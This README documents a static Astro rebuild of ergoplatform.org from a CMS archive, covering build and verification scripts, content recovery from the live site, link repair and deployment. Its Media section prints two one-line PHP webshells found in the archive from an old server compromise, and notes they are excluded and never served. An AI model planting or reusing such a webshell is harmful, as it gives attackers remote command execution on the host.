# ergoplatform.org

Static rebuild of ergoplatform.org, generated from the Strapi 4.3.9 / PostgreSQL
archive in `ergo-site-export/`.

Astro 7, `output: 'static'`, no server. Every page is prerendered at build time, so
the HTML is cacheable at the edge — which the current Next.js deployment is not: it
returns `cache-control: public, max-age=0, must-revalidate` and `cf-cache-status:
DYNAMIC` for every request, and re-renders on every hit.

## Requirements

- Node 22.12+ (`engines` in package.json)
- For `npm run import` only: a local PostgreSQL holding the CMS dump, and the
  `uploads/` directory from the archive

The build itself needs neither. Content is committed as Markdown, so a contributor
clones and builds without a database.

## Commands

```bash
npm install
npm run dev            # local dev server
npm run build          # -> dist/
npm run serve          # serve dist/ on 127.0.0.1:4400 (what the checks expect)

npm run import         # re-import content from the CMS archive (needs postgres)

# verification — all four run in CI
npm run verify:links   # every internal link in dist/ resolves
npm run verify:pages   # a sample of routes loads without erroring, in a real browser
npm run verify:i18n    # every t() key a template uses resolves
python3 scripts/check-imports.py
python3 scripts/check-frontmatter.py

# comparing against production
npm run compare:live -- --all
npm run diff:body
npm run shots -- /en/ /en/discover/       # full-page captures, ours and live
npm run measure:live -- <url> 'h1::Posts' # rendered text width and line count

# comparing two builds of this repo (e.g. across a dependency upgrade)
npm run diff:builds  -- /path/to/old-dist dist   # markup, route and asset diff
npm run compare:builds -- 4400 4401 /en/ /en/blog/ # rendered text, boxes and type
```

The last two are the pair that answers "did this upgrade change anything a reader can
see?". `diff-builds.py` normalises asset hashes and compares the markup; `compare-builds.mjs`
serves both builds side by side and compares `innerText`, element geometry and computed
fonts in a real browser. They are written to be run after any framework bump — see
`docs/upgrade-notes.md`.

`verify:pages` needs `playwright-core` and a chromium build (`npx playwright install
chromium`). It is the only check that loads pages, so it is the only one that catches a
component which throws at render time.

`npm run import` runs, in order:

| Step | Script | What it does |
|---|---|---|
| 1 | `export-from-db.mjs` | database → `src/content/**/*.md`, one file per entry |
| 2 | `export-media.mjs` | copies the uploads still referenced into `public/uploads/` |
| 3 | `rewrite-links.mjs` | repairs internal links (see below) |
| 4 | `write-redirects.mjs` | writes `public/_redirects` and `public/robots.txt` |

The output is committed. `npm run import` is for pulling in new CMS content, not part
of the normal build.

## Recovering what the CMS never held

The live Next.js source hardcoded a substantial amount of copy and artwork that was never
typed into the CMS. It is not in the archive, but most of it *is* present in the rendered
HTML, so three scripts read it back out. Their output is committed, so the build never
depends on the network and none of these run in CI:

| Script | Reads | Produces |
|---|---|---|
| `recover-geterg.mjs` | `/en/get-erg/` | the wallets table, 9 mining pools, 5 miners |
| `recover-home.mjs` | `/en/` | the HIGHLIGHTS carousel, and the destinations for the copy that lives in the i18n bundles |
| `fetch-illustrations.py` | several pages | the artwork production inlines as SVG rather than serving by URL |
| `fetch-artwork.py` | production's CSS and JS bundles | the 119 section artwork files, 5.6 MB |
| `recover-card-art.mjs` | `/en/` | the four WHAT MAKES ERGO UNIQUE card motifs |

`fetch-artwork.py` is worth singling out. An earlier revision of this project recorded
production's illustrations as unrecoverable, on the grounds that they rendered client-side
and never appeared in the served markup. They do not: they are static files under
`/assets/<section>/`, reachable through `background-image` and `<picture>` once the page has
hydrated. The script reads its list out of production's own bundles rather than hard-coding
it, so a new section is picked up automatically.

Everything else on those pages comes from `src/i18n/messages/`, which is already
translated into all twelve locales — so the recovered copy is the exception, not the rule.

Production rate-limits and drops connections above roughly four concurrent requests, so
each script takes one page at a time, retries with a backoff, and waits on
`domcontentloaded` rather than `networkidle` (the live pages embed a chat widget that polls,
so `networkidle` never fires).

## Layout

```
src/
  content/
    posts/<locale>/<slug>.md     1620 posts, one file each
    categories|roadmaps|team|exchanges|documents|faqs|dapps|projects|partners|favorites/
    pages/                      legal, privacy, wallet page (content, not code)
  i18n/
    config.ts                   the 12 locales, legacy /cn -> /zh
    routes.ts                   route table and page size, shared with getStaticPaths
    messages/<locale>.json      UI strings
  layouts/Base.astro            shell, theme, hreflang
  components/                   Header, Footer, PostCard, BlogList, PillButton, Illustration
  components/home/              the home page sections
  lib/illustrations.ts          the illustrations production inlines in its markup
  pages/[locale]/               every route
  styles/global.css             the type scale and the section treatments
scripts/                        the import pipeline, the verification tools, and the
                                recovery scripts that read the live site
public/uploads/                 media served from the archive
public/illustrations/           artwork recovered from the served HTML
public/fonts/                   Roboto and Archivo, self-hosted
```

## Adding a post

Create `src/content/posts/en/<slug>.md`. The filename is a handle for humans; the
URL comes from the `slug` field in frontmatter.

```markdown
---
cmsId: 0
title: Your title
slug: your-title
type: blog          # blog | news
locale: en
date: 2026-01-01T00:00:00
author: Ergo Platform
tags: ["Ecosystem"]
spotlight: false
subtitle: null
image: null
externalUrl: null
---

Body in Markdown.
```

Then add `src/content/posts/<other-locale>/<same-slug>.md` for a translation. Pages
fall back to English when a locale has no translation, so a post is usable as soon as
the English file exists.

### Do not normalise the slug

`slug` is the URL. It is taken verbatim from the CMS `permalink` column and must stay
byte-identical, because:

- 81 permalinks in the archive contain non-ASCII characters or spaces
- 8 of those would be rewritten by a slugifier
- renaming one silently breaks a live URL

A title change never affects a URL, because the URL does not come from the title.
Renaming the *file* is what changes it — and `scripts/write-redirects.mjs` is where the
corresponding redirect belongs.

## Link handling

The archive's internal links needed repair. `rewrite-links.mjs` does this on import:

- absolute `https://ergoplatform.org/<locale>/x` → `/x`
- `/img/…`, `/docs/…` → `/uploads/<file>`, or `docs.ergoplatform.com` where the archive
  has no copy (those paths 403 on the live site today)
- locale-less `/blog/<slug>` → `/<locale>/blog/<slug>`
- `/news/<slug>` → `/<locale>/blog/<slug>` (the two sections are unified here)
- slug casing drifted from the canonical permalink → corrected
- a slug that only exists in another locale → linked at that locale
- `/cn/…` → `/zh/…`
- filesystem paths that leaked out of the CMS, e.g. `../../../static/img/uploads/x.jpg`
  → `/uploads/x.jpg`
- bare domains with no scheme → `https://…`

That took internal link failures from 581 to 0. The 17 remaining were already broken
in the source and are listed in `scripts/known-broken.mjs`, so CI fails on new breakage
without failing on the existing baseline.

## Verification

```bash
npm run build
npm run verify:links                    # 0 broken, 160238 checked
npm run verify:pages                    # 132 sampled routes, 0 problems
npm run verify:i18n                     # 128 keys, 0 problems
python3 scripts/check-frontmatter.py    # all 1794 files parse as YAML
python3 scripts/check-imports.py        # all relative imports resolve
python3 scripts/compare-with-live.py --all   # status + title against production
python3 scripts/diff-article-body.py --prose-only   # article prose, chrome excluded
python3 scripts/diff-sections.py                  # section inventory
```

The four checks are each catching something the build alone cannot:

| Check | What the build cannot see |
|---|---|
| `verify:links` | a post that renders perfectly and points at a page never generated |
| `verify:pages` | a component that throws, a script that fails, a heading a conditional dropped |
| `verify:i18n` | a wrong key or wrong casing — `t()` returns the key itself, so it renders as visible text |
| `check-frontmatter` | a contributed post whose frontmatter is not the shape the schema expects |

`compare-with-live.py` is the one that matters before a cutover: it walks every route
this build produces, fetches the same URL from ergoplatform.org, and reports status
and title differences.

**Result: no regressions.** Every route that exists on both returns 200 from
production with a matching title, except the category and root pages where this build
gives a more descriptive title. Every route where the status differs is one the live
site does not have:

- 78 static pagination pages (`/en/blog/page/2/` and so on). The live site accepts a
  `?page=` query and ignores it, always returning the same 18 posts.
- 7 manifesto pages for locales that have no manifesto post. Live 404s; this build
  falls back to the English text.
- `/404`, this build's own error page.

Three routes where production's `<title>` is worse than this build's: the category
pages (live uses a bare "Blog" for all 119 of them) and the locale-less redirect
shells.

See `docs/output-diff.md` for what the rendered pages do and do not match,
`docs/visual-comparison.md` for the measured visual work against production,
`docs/data-notes.md` for the archive defects that shaped the output, and
`docs/upgrade-notes.md` for how the Astro 5 → 7 bump was verified not to change anything.

The most important thing that comparison found: **the CMS export is not the whole
site.** All 1620 posts and every collection render correctly, but the live Next.js
source hardcoded the wallet table, the mining pool and miner lists, the blockchain
explorer directory, and the section copy on the home, discover, community and
ecosystem pages.

Most of that turned out to be recoverable — not from the archive, but from the rendered
site, since the copy is present in the HTML even though it was never typed into the CMS.
`scripts/recover-geterg.mjs`, `scripts/recover-home.mjs` and
`scripts/fetch-illustrations.py` read it back out and commit the result. What is left is
listed page by page in `docs/output-diff.md` section 2a.

## Live data

Two values are genuinely live — network hashrate, difficulty, supply. They are fetched
client-side from `https://api.ergoplatform.com/info` by a small script on the home and
get-erg pages. The page itself stays static and cached; only the numbers refresh.

## Media

`public/uploads/` holds 1213 files (397 MB) — everything the published content
references. 1333 files (239 MB) in the archive are referenced by nothing and are not
copied. Filenames are preserved exactly, because 118 post bodies and every collection
entry reference them literally.

**The repository is 369 MB because of this, and that is a decision worth revisiting.**
`git clone` takes a while for a first-time contributor, which works against the
"anyone can contribute" goal. Two options:

| Option | Repo | Trade-off |
|---|---|---|
| Media committed (current) | 369 MB | build is self-contained and works offline; slow first clone |
| Media served from GCS | ~12 MB | fast clone; the build depends on the bucket, and a missing object is a broken image |

The live site already 308-redirects `/uploads/*` to
`storage.googleapis.com/ergo-cms-media`, so the bucket is a live dependency in
production today either way. Switching means gitignoring `public/uploads/`, adding a
fetch step to the build, and pointing the media paths at the CDN. Worth deciding
before opening the repository to outside contributions.

The archive also contains two files that are **not** copied:

```
uploads/shell_c8157369ab.php     <?php system($_GET['c']); ?>
uploads/test_379a40abd7.phtml    <?php system($_GET['c']); ?>
```

Webshells from an old compromise of the origin server. They are not in the CMS `files`
table and no published post references them. They are never served.

### Files scraped from production

Beyond `public/uploads/`, these are copies taken from ergoplatform.org rather than from any
documented source of record:

| Path | What it is |
|---|---|
| `public/assets/` | 119 section artwork files, 5.6 MB — `npm run fetch:artwork` |
| `public/artwork/unique/` | the four WHAT MAKES ERGO UNIQUE motifs — `npm run recover:cards` |
| `public/illustrations/` | the `/discover/` 3D hexagon, light and dark — `npm run fetch:illustrations` |
| `public/fonts/` | Roboto (Apache-2.0) — `npm run fetch:fonts` |
| `src/content/pages/wallets.*.json`, `mining-pools.*.json`, `miners.*.json`, `home-highlights.*.json` | data read out of the rendered DOM |

This is the same category of file in each case: content belonging to the site being rebuilt,
which the CMS archive does not hold and no other source provides. It is listed here so the
provenance is explicit rather than discovered later. **Confirm the position before cutover** —
in particular whether the Ergo Foundation holds the rights to redistribute the artwork as
part of the site's own assets, which is likely but not established by anything in the
archive. `public/assets.manifest.json` records every fetched file and its size.

The display *typeface* is a separate and less comfortable question. Production sets headings
in Vinila Extended, a commercial Dinamo face that cannot be redistributed; this build
substitutes Archivo. See "Known gaps".

## Deployment

Static output, so any static host works. Cloudflare Pages is the intended target:

- build command `npm run build`, output directory `dist`
- `public/_redirects` is honoured for the `/cn/*` → `/zh/*` and `/news/*` → `/blog/*`
  redirects, plus locale-less paths → the default locale (`ru`)
- `.github/workflows/build.yml` runs the build, the link check, the i18n check and a
  browser page sweep on every push, and deploys a preview for every pull request when
  the Cloudflare secrets are set

Content caching headers for `/uploads/*` should be set at the host — those files are
immutable under their hashed names.

## Known gaps

- **The live site is a visual reference, not a pixel match.** The type scale, header,
  hero, post cards and every page's section structure were matched against production by
  measurement — see `docs/visual-comparison.md`. Three things are still approximated:
  production's donut charts and section motifs are bespoke illustration work, and only
  the `/discover/` hero survived in the served markup to be recovered; the HIGHLIGHTS
  carousel and the WHAT MAKES ERGO UNIQUE cards use the site's own hexagon instead. The
  Next.js source was never available, only its compiled bundles and its rendered HTML.
- **The display face is a substitute.** Production sets headings in "Vinila Extended", a
  commercial Dinamo typeface that cannot be redistributed. Roboto (Apache-2.0) is used
  as-is; Archivo stands in for the display face at an 88% stretch, chosen because it is
  the closest free grotesque that occupies the same width as the original at the same
  size. Archivo has no Cyrillic, so Russian headings fall back to Roboto.
- **`/privacy-policy` is a placeholder.** On the live site that page renders the same
  text as `/legal`, which looks like a template bug. The file here contains an accurate
  description of what this build does and no more. Replace it with a real policy.
- **`changing_the_worlds`** is exported (3 entries) because the CMS holds it, but the
  live site renders nothing from it and neither does this build.
- **`contact_requests`** (544 rows of names, emails and messages) is deliberately not
  exported. It is not part of the site and is personal data.
- **36 URLs are claimed by two CMS posts each** (a `blog` and a `news` row with an
  identical permalink). This build serves the lower id; production serves the lower id
  on 29 of 36 and the higher id on 7, with no rule that explains the difference. Full
  detail in `docs/data-notes.md`.
- **Markdown stays on the `unified` pipeline.** Astro 7 makes its own Sätteri parser the
  default, but `remark-gfm` is load-bearing here: 98 archived documents contain bare URLs
  that only become links under GFM's autolink literal, and others rely on table syntax.
  Porting that to a Sätteri plugin would change rendering across the whole corpus, so
  `astro.config.mjs` pins `processor: unified()` and keeps `@astrojs/markdown-remark`
  installed. Worth revisiting on the next content migration, not in a version bump.
